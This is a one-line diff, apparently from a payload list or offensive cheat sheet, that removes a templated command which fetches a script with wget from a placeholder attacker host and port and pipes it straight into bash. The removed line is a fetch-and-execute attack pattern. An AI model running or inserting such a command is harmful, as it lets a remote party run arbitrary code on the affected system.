@@ -1,1 +1,0 @@
-bash <(wget -qO- http://<lhost>:<lport>/<file=script.sh>)
